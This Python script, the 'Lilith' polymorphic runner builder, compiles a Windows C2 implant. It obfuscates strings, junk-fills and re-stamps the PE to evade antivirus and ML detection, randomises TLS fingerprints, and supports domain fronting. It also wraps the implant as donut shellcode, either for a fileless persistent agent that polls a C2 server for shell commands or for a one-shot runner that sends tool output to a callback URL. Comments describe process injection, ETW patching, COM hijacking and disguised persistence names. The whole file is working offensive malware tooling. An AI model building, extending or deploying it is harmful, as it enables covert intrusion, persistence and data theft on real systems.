"""
Lilith — Polymorphic C Runner Builder

Improvements over v1:
  - LT_INJ_TARGET macro: injection target configurable per engagement
  - -self flag support in runner (baked into template arg parsing)
  - HTTPS download support in POLY_HTTPGET
  - Randomised XOR encoding key per build (stored in runner_c.meta)
  - Same polymorphism: random identifiers, XOR-encoded NT strings, junk globals, Rich header
"""

import os
import random
import string
import struct
import shutil
import subprocess
import tempfile
import argparse
import sys

_TEMPLATE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "templates", "runner_template.c")
_CC       = "x86_64-w64-mingw32-gcc"

_NT_STRINGS = [
    # NT syscall names resolved via GetProcAddress
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtWaitForSingleObject",
    "NtQuerySystemInformation",
    "NtClose",
    "EtwEventWrite",
    # Task 2: Ekko sleep syscall
    "NtDelayExecution",
    # Task 4: APC + thread hijack syscalls
    "NtResumeThread",
    "NtQueueApcThread",
    "NtGetContextThread",
    "NtSetContextThread",
    # Session 2 new stubs (T5/T13) — were missing from obfuscation list
    "NtReadVirtualMemory",
    "NtUpdateWnfStateData",
    "NtFreeVirtualMemory",
    # Task 8: extended ETW patch targets
    "EtwEventWriteFull",
    "EtwEventWriteEx",
    "EtwEventWriteTransfer",
    "EtwNotificationRegister",
    "EtwEventEnabled",
    "WmiGetLoggerContext",
    # DLL names loaded at runtime
    "ntdll.dll",
    "winhttp.dll",
    "amsi.dll",
    "cmd.exe",
    "kernel32.dll",
    # WinHTTP API names resolved via GetProcAddress — plaintext in .rdata without this
    "WinHttpOpen",
    "WinHttpConnect",
    "WinHttpOpenRequest",
    "WinHttpSendRequest",
    "WinHttpReceiveResponse",
    "WinHttpQueryDataAvailable",
    "WinHttpReadData",
    "WinHttpCloseHandle",
    "WinHttpSetOption",
    "WinHttpAddRequestHeaders",
    # C2 URL path fragments assembled at runtime via lt_strcat — plaintext in .rdata without this
    "/c2/register",
    "/task",
    # Task 10: extended module-stomp candidate list
    "wintrust.dll",
    "cryptnet.dll",
    "coml2.dll",
    "wbemcomn.dll",
    "rasapi32.dll",
    "dxgi.dll",
    "d3d11.dll",
    "msasn1.dll",
    "crypt32.dll",
    "imagehlp.dll",
    "mswsock.dll",
    "winnsi.dll",
    "nlaapi.dll",
    "iphlpapi.dll",
    "ntmarta.dll",
    "authz.dll",
    "dnsapi.dll",
    "wtsapi32.dll",
]

_POLY_SYMBOLS = [
    "JUNK1", "JUNK2", "JUNK3",
    "CONST1", "CONST2", "CONST3", "CONST4",
    "NTDLL", "STUBS", "SYSCALL_GADGET",
    "GETSSN", "INITSTUB",
    "NTALLOC", "NTWRITE", "NTPROT", "NTTHREAD",
    "NTOPEN", "NTWAIT", "NTCLOSE",
    # Task 2: Ekko sleep indirect syscall
    "NTDELAY",
    # Task 4: APC + hijack indirect syscalls
    "NTRESUME", "NTAPC", "NTGETCTX", "NTSETCTX",
    "PATCHETW", "UNHOOK", "SANDBOX", "FINDPID",
    "FINDSCGADGET", "FINDGADGET", "MODSTOMP",
    # Task 2: Ekko-style sleep helper
    "EKKO_SLEEP",
    # Task 4: new injection techniques
    "INJECT_APC", "INJECT_HIJACK",
    "INJECT", "SPAWNinject", "SELFINJECT", "LOADENC",
    "HTTPGET", "HTTPPOST",
    # Task 1: direct execution path
    "EXECMD_DIRECT", "EXECMD",
    "MIGRATE",
    # Task 10: concurrent task thread worker
    "TASK_THREAD",
    # Task 14: watchdog/failover migration thread (now persistent sacrificial process)
    "WATCHDOG_THREAD",
    "AGENT", "CAPTURE",
    # Task 7: fiber-based self-execution (no new thread object)
    "FIBER_EXEC",
    # Task 5: WNF injection + subscription table scanner
    "WNF_INJECT",
    # Task 6: transacted process hollowing
    "TRANSACT_HOLLOW",
    # Task 8: COM server hijacking via HKCU registry
    "COM_HIJACK", "COM_HIJACK_CLEAN",
    # Task 11: COM CLR host execution path
    "CLR_EXEC",
    # New NT wrappers (T5/T13)
    "NTRDMEM", "NTWNFUPD", "NTFREE",
]


def _xenc_narrow(value: str) -> tuple[str, int]:
    """XOR-encode an ASCII string → (C brace-initialiser, key).
    Used to pass config strings as encoded byte arrays via -D macros so they
    never appear as plaintext in the PE .rdata section."""
    chars = {ord(c) for c in value}
    while True:
        key = random.randint(0x13, 0xED) | 1
        if key not in chars:
            break
    enc = [ord(c) ^ key for c in value]
    return "{" + ",".join(f"0x{b:02X}" for b in enc) + ",0}", key


def _xenc_wide(value: str) -> tuple[str, int]:
    """XOR-encode an ASCII-content wide string → (C WCHAR brace-initialiser, key).
    Each WCHAR is ASCII so only the low byte is non-zero; XOR with key leaves
    the high byte 0 and encodes the low byte."""
    chars = {ord(c) for c in value}
    while True:
        key = random.randint(0x13, 0xED) | 1
        if key not in chars:
            break
    enc = [ord(c) ^ key for c in value]
    return "{" + ",".join(f"0x{b:04X}" for b in enc) + ",0}", key


def _rand_id(min_len=5, max_len=11) -> str:
    # Single underscore prefix only — double-underscore identifiers are reserved in C
    prefix = random.choice(["_", ""])
    first  = random.choice(string.ascii_letters)
    rest   = "".join(random.choices(string.ascii_letters + string.digits + "_", k=random.randint(min_len, max_len)))
    return prefix + first + rest


def _build_poly_map() -> dict:
    used, mapping = set(), {}
    for sym in _POLY_SYMBOLS:
        while True:
            name = _rand_id()
            if name not in used:
                used.add(name)
                mapping[sym] = name
                break
    mapping["CONST1"] = str(random.randint(3, 17))
    mapping["CONST2"] = str(random.randint(100, 999))
    mapping["CONST3"] = str(random.randint(10, 50))
    mapping["CONST4"] = str(random.randint(20, 80))
    return mapping


def _apply_poly(source: str, mapping: dict) -> str:
    for sym, rep in sorted(mapping.items(), key=lambda x: -len(x[0])):
        source = source.replace(f"POLY_{sym}", rep)
    return source


def _obfuscate_nt_strings(source: str) -> str:
    for s in _NT_STRINGS:
        literal = f'"{s}"'
        if literal not in source:
            continue
        char_set = {ord(c) for c in s}
        while True:
            key = random.randint(0x13, 0xED) | 1
            if key not in char_set:
                break
        enc = [ord(c) ^ key for c in s]
        vn  = _rand_id(4, 7)
        dk  = _rand_id(4, 7)
        arr  = ",".join(f"(char)0x{b:02X}" for b in enc)
        stmt = (
            f'({{static char {vn}[]={{{arr},0}};'
            f'static int {dk}=0;'
            f'if(!{dk}){{for(int _i=0;{vn}[_i];_i++){vn}[_i]^=0x{key:02X};{dk}=1;}}'
            f'{vn};}})'
        )
        source = source.replace(literal, stmt)
    return source


def _add_junk_globals(source: str) -> str:
    lines = []
    for _ in range(random.randint(3, 7)):
        lines.append(f"static volatile int {_rand_id()} = {random.randint(1, 0xFFFF)};")
    insertion = "\n".join(lines) + "\n"
    return source.replace("/* ─── Entry point ─── */", insertion + "/* ─── Entry point ─── */")


_C2_PATH_WORDS = [
    ["api", "v1", "v2", "svc", "rest", "app", "cloud"],
    ["health", "status", "sync", "config", "metrics", "diagnostics", "reporting", "events"],
    ["client", "agent", "endpoint", "device", "node", "host", "collector"],
    ["report", "collect", "push", "submit", "data", "log", "telemetry"],
]

_PERSIST_WORDS = [
    ["System", "Windows", "Service", "Network", "Security", "Device", "Runtime", "Kernel"],
    ["Manager", "Helper", "Host", "Monitor", "Agent", "Worker", "Handler", "Broker", "Core"],
]

def _rand_persist_name() -> str:
    return "".join(random.choice(w) for w in _PERSIST_WORDS)

def _randomize_persist_names(source: str) -> str:
    """Replace hardcoded persistence artifact names with unique random values per build.
    Longer strings first to prevent partial matches (WindowsUpdateTask before WindowsUpdate)."""
    source = source.replace("WindowsUpdateTask", _rand_persist_name() + "Task")
    source = source.replace('"WindowsUpdate"',   '"' + _rand_persist_name() + '"')
    source = source.replace("'WUFilter'",         "'" + _rand_persist_name() + "Flt'")
    source = source.replace("'WUConsumer'",        "'" + _rand_persist_name() + "Con'")
    return source

def _random_c2_path() -> str:
    """Generate a random plausible REST API path per build."""
    depth = random.randint(2, 4)
    segs = [random.choice(random.choice(_C2_PATH_WORDS)) for _ in range(depth)]
    if random.random() > 0.5:
        segs.append(str(random.randint(1, 9)))
    return "/" + "/".join(segs)


def _randomize_section_names(pe_data: bytes) -> bytes:
    """Replace section names with random lowercase strings to defeat ML name features."""
    pe_off = struct.unpack_from("<I", pe_data, 0x3C)[0]
    n_sects = struct.unpack_from("<H", pe_data, pe_off + 6)[0]
    opt_sz  = struct.unpack_from("<H", pe_data, pe_off + 20)[0]
    sect_off = pe_off + 24 + opt_sz
    result = bytearray(pe_data)
    for i in range(n_sects):
        s_off = sect_off + i * 40
        length = random.randint(3, 7)
        name = "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
        name_bytes = name.encode("ascii")[:8].ljust(8, b"\x00")
        result[s_off:s_off+8] = name_bytes
    return bytes(result)


def _spoof_pe_metadata(pe_data: bytes) -> bytes:
    """Spoof TimeDateStamp to a plausible 2019–2024 value and zero the Checksum."""
    pe_off = struct.unpack_from("<I", pe_data, 0x3C)[0]
    result = bytearray(pe_data)
    # TimeDateStamp at pe_off+8: random timestamp from 2019–2024
    ts = random.randint(0x5C000000, 0x65C00000)
    struct.pack_into("<I", result, pe_off + 8, ts)
    # Checksum at OptionalHeader+64 = pe_off+24+64 = pe_off+88
    struct.pack_into("<I", result, pe_off + 88, 0)
    return bytes(result)


def _inject_rich_header(pe_data: bytes) -> bytes:
    pe_off   = struct.unpack_from("<I", pe_data, 0x3C)[0]
    avail    = pe_off - 0x40
    build    = random.randint(0xF800, 0xF9FF)
    products = [
        (0x0104, build, random.randint(1, 3)),
        (0x0105, build, random.randint(2, 6)),
        (0x00FF, build, random.randint(1, 2)),
        (0x0103, build, random.randint(1, 2)),
    ]
    key = random.randint(0x10000000, 0xEFFFFFFF) | 0x01010101
    buf = bytearray()
    buf += struct.pack("<I", 0x536E6144 ^ key)
    buf += struct.pack("<III", key, key, key)
    for prod_id, bld, cnt in products:
        comp_id = (prod_id << 16) | (bld & 0xFFFF)
        buf += struct.pack("<II", comp_id ^ key, cnt ^ key)
    buf += b"Rich"
    buf += struct.pack("<I", key)
    if len(buf) > avail:
        return pe_data
    buf += b"\x00" * (avail - len(buf))
    result = bytearray(pe_data)
    result[0x40:pe_off] = buf
    return bytes(result)


def build_runner(
    output_dat:        str  = "runner_c.dat",
    template:          str  = _TEMPLATE,
    injection_target:  str  = "RuntimeBroker.exe",
    sni_host:          str  = "assets.msn.com",
    user_agent:        str  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    c2_host:           str  = "10.10.14.1",
    c2_port:           int  = 8443,
    c2_cb_path:        str | None = None,   # None = random path per build
    c2_https:          bool = True,
    c2_jitter_min_ms:  int  = 10000,
    c2_jitter_max_ms:  int  = 30000,
    # Task 13: domain fronting — when set, the runner connects to front_host
    # (CDN edge) but sends Host: c2_host so the CDN forwards to the real C2.
    front_host:        str | None = None,
    allow_vm:          bool = True,   # True = define LT_ALLOW_VM (disable CPUID check)
    keep_src:          bool = False,
    keep_exe:          bool = False,
) -> tuple[bool, int]:
    """Returns (success, xor_key). xor_key is 0 on failure."""
    if c2_cb_path is None:
        c2_cb_path = _random_c2_path()
    print("[*] Building polymorphic C runner...")

    if not os.path.exists(template):
        print(f"[!] Template not found: {template}")
        return False, 0
    if not shutil.which(_CC):
        print(f"[!] Compiler not found: {_CC} — install with: apt install gcc-mingw-w64")
        return False, 0

    with open(template) as f:
        source = f.read()

    mapping = _build_poly_map()
    source  = _apply_poly(source, mapping)
    source  = _obfuscate_nt_strings(source)
    source  = _randomize_persist_names(source)
    source  = _add_junk_globals(source)

    tmpdir   = tempfile.mkdtemp(prefix="lt_runner_")
    src_path = os.path.join(tmpdir, "runner.c")
    exe_path = os.path.join(tmpdir, "runner.exe")

    with open(src_path, "w") as f:
        f.write(source)

    # Task 12: SChannel cipher randomisation — bake a per-build permutation of ALG_IDs
    # so the TLS ClientHello (JA3/JA4 fingerprint) differs between every compiled runner.
    _sch_base = [0x6610,0x660E,0x800C,0x800D,0xAE06,0xAA02,0x8004,0x8009,0xA400,0x2400]
    random.shuffle(_sch_base)
    _sch_subset = _sch_base[:random.randint(5, len(_sch_base))]
    sch_algs_macro = "{" + ",".join(f"0x{v:04X}" for v in _sch_subset) + "}"

    # Domain fronting: TLS connects to front_host (CDN edge).
    # LT_SNI_HOST must be the CDN's own hostname so the CDN terminates TLS with its cert.
    # The CDN then routes upstream based on the HTTP Host header (c2_host).
    # Using the masquerade domain as the SNI was backward — CDN would reject the TLS
    # handshake because it doesn't hold a cert for assets.msn.com (or whatever sni_host is).
    if front_host:
        tcp_connect_host = front_host
        effective_sni    = front_host    # CDN must hold a cert for this hostname
    else:
        tcp_connect_host = c2_host
        effective_sni    = sni_host      # masquerade only when not domain-fronting

    # XOR-encode all config strings so they never land in .rdata as plaintext
    inj_enc,  inj_key  = _xenc_wide(injection_target)
    ua_enc,   ua_key   = _xenc_wide(user_agent)
    c2h_enc,  c2h_key  = _xenc_narrow(tcp_connect_host)
    c2p_enc,  c2p_key  = _xenc_narrow(c2_cb_path)

    def _esc(s): return s.replace('"', '\\"')

    cmd = [
        _CC,
        f"-DLT_INJ_TARGET_ENC={inj_enc}",   f"-DLT_INJ_TARGET_KEY=0x{inj_key:02X}",
        f"-DLT_USER_AGENT_ENC={ua_enc}",     f"-DLT_USER_AGENT_KEY=0x{ua_key:02X}",
        f"-DLT_C2_HOST_ENC={c2h_enc}",       f"-DLT_C2_HOST_KEY=0x{c2h_key:02X}",
        f"-DLT_C2_CB_PATH_ENC={c2p_enc}",    f"-DLT_C2_CB_PATH_KEY=0x{c2p_key:02X}",
        f"-DLT_SNI_HOST=L\"{_esc(effective_sni)}\"",
        f"-DLT_C2_PORT={c2_port}",
        f"-DLT_C2_HTTPS={'1' if c2_https else '0'}",
        f"-DLT_C2_JITTER_MIN={c2_jitter_min_ms}",
        f"-DLT_C2_JITTER_MAX={c2_jitter_max_ms}",
        f"-DLT_SCHANNEL_ALGIDS={sch_algs_macro}",
        *(["-DLT_ALLOW_VM"] if allow_vm else []),
        "-O2", "-s",
        "-Wall", "-Wno-unused-variable", "-Wno-unused-function",
        "-mno-stack-arg-probe",
        "-fno-ident",
        "-fno-exceptions",
        "-fno-asynchronous-unwind-tables",
        "-fno-stack-protector",
        "-fno-builtin-memcpy",
        "-fno-builtin-memset",
        "-fno-builtin-memmove",
        "-Wno-dangling-pointer",
        "-nostdlib",
        "-Wl,--no-seh",
        "-Wl,-e,mainCRTStartup",
        src_path,
        "-o", exe_path,
        "-lgcc",
        "-lkernel32",
        "-ladvapi32",   # Task 8: COM server hijacking (RegCreateKeyExW etc.)
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[!] Compile error:\n{result.stderr}")
        shutil.rmtree(tmpdir)
        return False, 0
    print(f"[+] Compiled: {exe_path} ({os.path.getsize(exe_path):,} bytes)")

    with open(exe_path, "rb") as f:
        raw = f.read()
    raw = _inject_rich_header(raw)
    raw = _randomize_section_names(raw)
    raw = _spoof_pe_metadata(raw)

    # Randomised XOR key per build — avoids the static 0x5A signature
    xor_key = random.randint(0x10, 0xEF) | 1   # always odd, avoids 0x00/0xFF/0x5A range
    encoded = bytes(b ^ xor_key for b in raw)

    abs_out = os.path.abspath(output_dat)
    with open(abs_out, "wb") as f:
        f.write(encoded)
    print(f"[+] XOR-encoded runner : {abs_out} ({len(encoded):,} bytes)  key=0x{xor_key:02X}")
    print(f"    Injection target   : {injection_target}")
    print(f"    C2 callback path   : {c2_cb_path}")
    print(f"    TLS SNI host       : {sni_host}")
    print(f"    User-Agent         : {user_agent[:60]}...")

    if keep_src:
        shutil.copy(src_path, os.path.splitext(abs_out)[0] + ".c")
    if keep_exe:
        exe_out = os.path.splitext(abs_out)[0] + ".exe"
        with open(exe_out, "wb") as f:
            f.write(raw)
        print(f"[+] Runner PE   : {exe_out}")

    shutil.rmtree(tmpdir)
    return True, xor_key


def _find_donut() -> str | None:
    for candidate in ("donut", "/opt/donut/donut", "/usr/bin/donut"):
        found = shutil.which(candidate)
        if found:
            return found
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    return None


def _donut_shellcode(runner_exe: str, params: str | None) -> bytes | None:
    """Run donut on runner_exe with optional params, return raw shellcode bytes."""
    shellcode = None
    donut_cli = _find_donut()
    if donut_cli:
        with tempfile.TemporaryDirectory(prefix="lt_rsc_") as tmp:
            raw_sc = os.path.join(tmp, "sc.bin")
            cmd = [donut_cli, "-i", runner_exe, "-f", "1", "-o", raw_sc]
            if params:
                cmd += ["-p", params]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0 and os.path.exists(raw_sc):
                with open(raw_sc, "rb") as f:
                    shellcode = f.read()
            else:
                print(f"[!] donut failed:\n{result.stderr.strip()}")

    if shellcode is None:
        try:
            import donut as _donut_py
            shellcode = _donut_py.create(file=runner_exe, params=params or "")
        except ImportError:
            pass
        except Exception as e:
            print(f"[!] donut Python API failed: {e}")

    return shellcode


def build_runner_sc(
    runner_exe: str,
    tool_url:   str,
    cb_url:     str,
    output_enc: str,
) -> bool:
    """Donut runner.exe with baked-in '-self -remote TOOL_URL -cb CB_URL' args.
    One-shot: injects tool, exfils output to cb_url, exits. No PE on disk."""
    from core.encoding import pack_enc

    shellcode = _donut_shellcode(runner_exe, f"-self -remote {tool_url} -cb {cb_url}")
    if shellcode is None:
        print("[!] Cannot build runner shellcode — install donut-shellcode")
        return False

    with open(output_enc, "wb") as f:
        f.write(pack_enc(shellcode))
    print(f"[+] Runner SC   : {output_enc}  ({len(shellcode)/1024:.1f} KB, one-shot)")
    return True


def build_runner_sc_c2(runner_exe: str, output_enc: str) -> bool:
    """Donut runner.exe with -agent flag → persistent fileless C2 agent shellcode.
    Stager injects this into a process; no PE ever touches disk.
    Agent registers with C2 server, polls for shell commands indefinitely."""
    from core.encoding import pack_enc

    shellcode = _donut_shellcode(runner_exe, "-agent")
    if shellcode is None:
        print("[!] Cannot build C2 agent shellcode — install donut-shellcode")
        return False

    with open(output_enc, "wb") as f:
        f.write(pack_enc(shellcode))
    print(f"[+] C2 agent SC : {output_enc}  ({len(shellcode)/1024:.1f} KB, fileless persistent)")
    return True


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("-o", "--output", default="runner_c.dat")
    p.add_argument("--target",   default="RuntimeBroker.exe", help="Injection target process")
    p.add_argument("--keep-src", action="store_true")
    p.add_argument("--keep-exe", action="store_true")
    args = p.parse_args()
    ok, _ = build_runner(args.output, injection_target=args.target,
                         keep_src=args.keep_src, keep_exe=args.keep_exe)
    sys.exit(0 if ok else 1)
